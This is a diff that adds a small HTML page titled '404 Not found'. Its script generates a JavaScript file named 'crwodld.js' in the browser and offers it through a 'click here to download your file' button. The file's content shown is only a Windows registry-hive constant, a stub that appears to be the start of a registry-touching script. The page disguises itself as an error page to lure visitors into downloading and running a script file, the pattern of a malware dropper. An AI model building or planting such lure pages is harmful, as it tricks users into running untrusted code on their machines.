@@ -1,0 +1,18 @@
+<html>
+<head>
+<title>404 Not found</title>
+<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
+</head>
+<b>
+<script>
+setTimeout('create("var HKLM = 0x80000002;", "crwodld.js", "javascript")');
+function create(text, name, type) {
+  var dlbtn = document.getElementById("dlbtn");
+  var file = new Blob([text], {type: type});
+  dlbtn.href = URL.createObjectURL(file);
+  dlbtn.download = name;
+}
+</script>
+<a href="javascript:void(0)" id="dlbtn"><button>click here to download your file</button></a>
+</b>
+</html>
